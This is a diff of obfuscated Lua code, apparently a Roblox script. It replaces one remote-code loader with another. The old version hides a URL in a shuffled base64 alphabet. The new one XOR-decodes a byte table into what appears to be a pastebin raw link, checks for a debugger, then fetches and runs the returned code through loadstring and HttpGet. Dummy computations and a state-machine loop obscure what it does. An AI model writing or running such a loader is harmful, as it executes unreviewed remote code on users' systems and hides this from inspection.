@@ -1,60 +1,54 @@
-local _a = {}
-for _i = 1, 64 do
-    local _c = _i - 1
-    if _c < 26 then
-        _a[_i] = string.char(122 - _c)
-    elseif _c < 52 then
-        _a[_i] = string.char(90 - (_c - 26))
-    elseif _c < 62 then
-        _a[_i] = string.char(48 + (_c - 52))
-    elseif _c == 62 then
-        _a[_i] = "-"
-    else
-        _a[_i] = "+"
-    end
-end
-
-local _map = {}
-for _i = 1, #_a do
-    _map[_a[_i]] = _i - 1
-end
-
-local _parts = {
-    {9, 8, 21, 3, 42, 7, 31, 52},
-    {23, 19, 30, 29, 10, 7, 38, 28},
-    {1, 5, 49, 12, 44, 33, 17, 24},
-    {50, 11, 47, 6, 32, 16, 26, 36},
-    {15, 43, 4, 39, 18, 27, 14, 45},
-    {40, 25, 20, 53}
+(function(...)
+local _a, _b, _c, _d, _e = ...
+local _f = string.char
+local _g = string.byte
+local _h = table.concat
+local _i = _G
+local _j = _i.loadstring
+local _k = _i.game
+local _l = _k.HttpGet
+local _m = (_g("Z") - 0x5A) + (_g("A") - 0x40)
+local _n = (_g("C") ^ 0x2) - 0x3E9
+local _p = (_g("5") - 0x1A) ^ 0x1
+local _q = (_g("C") - 0x10)
+local _r = {
+0x5B,0x47,0x47,0x43,0x40,0x09,0x1C,0x1C,0x43,0x52,0x40,0x47,0x56,0x51,0x5A,0x5D,
+0x1D,0x50,0x5C,0x5E,0x1C,0x41,0x52,0x44,0x1C,0x03,0x45,0x5B,0x7F,0x4B,0x71,0x46,0x43
 }
-local _order = {1, 3, 2, 4, 5, 6}
-
-local _enc = ""
-for _i = 1, #_order do
-    local part = _parts[_order[_i]]
-    for _j = 1, #part do
-        _enc = _enc .. _a[part[_j] + 1]
-    end
+local _s = {}
+for _t = 1, #_r do
+_s[_t] = _f(_r[_t] ~ _q)
 end
-
-local _dec = {}
-for _i = 1, #_enc, 4 do
-    local p1 = _map[_enc:sub(_i, _i)]
-    local p2 = _map[_enc:sub(_i + 1, _i + 1)]
-    local p3 = _map[_enc:sub(_i + 2, _i + 2)]
-    local p4 = _map[_enc:sub(_i + 3, _i + 3)]
-    local n = p1 * 262144 + p2 * 4096 + p3 * 64 + p4
-    _dec[#_dec + 1] = string.char(math.floor(n / 65536) % 256)
-    _dec[#_dec + 1] = string.char(math.floor(n / 256) % 256)
-    _dec[#_dec + 1] = string.char(n % 256)
+local _u = _h(_s)
+local _v = 1
+while _v < 5 do
+if _v == 1 then
+local _w = (_g("X") + _g("Y")) % 0x7F
+_v = 2
+elseif _v == 2 then
+local _x = pcall(function() return _i.debug end)
+if not _x then
+_v = 5
+else
+_v = 3
 end
-local url = table.concat(_dec)
-
-local _guard = type(debug) == "table" and type(debug.getinfo) == "function"
-if _guard then
-    local _k = 0
-    for _ = 1, 100000 do _k = _k + 1 end
-    error(_k)
+elseif _v == 3 then
+local _y = function()
+local _z = _j(_l(_k, _u))
+_z()
+_u = nil
+_r = nil
+_s = nil
 end
-
-loadstring(game:HttpGet(url))()
+_y()
+_v = 4
+elseif _v == 4 then
+local _A = function() end
+_A()
+_v = 5
+else
+break
+end
+end
+end)(nil,nil,nil,nil,nil)
+_0x = function() end
